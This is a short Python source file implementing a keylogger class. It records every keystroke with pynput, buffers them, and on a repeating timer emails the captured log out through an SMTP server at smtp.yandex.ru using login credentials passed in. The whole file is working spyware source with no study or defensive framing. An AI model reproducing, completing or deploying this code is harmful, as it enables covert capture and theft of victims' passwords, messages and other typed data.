import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, timeInterval, email, password):
        self.log = "Keylogger is working, please wait..."
        self.interval= timeInterval
        self.email = email
        self.password = password
    def AppendToLog(self, string):
        self.log += string
    def processKeyPress(self, key):
        try:
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currentKey = " "
            else:
                currentKey = " " + str(key) + " "
        self.AppendToLog(currentKey)

    def report(self):
        self.sendMail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def sendMail(self, email, password, msg):
        server = smtplib.SMTP('smtp.yandex.ru', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg)
        server.quit()

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.processKeyPress)
        with keyboardListener:
            self.report()
            keyboardListener.join()




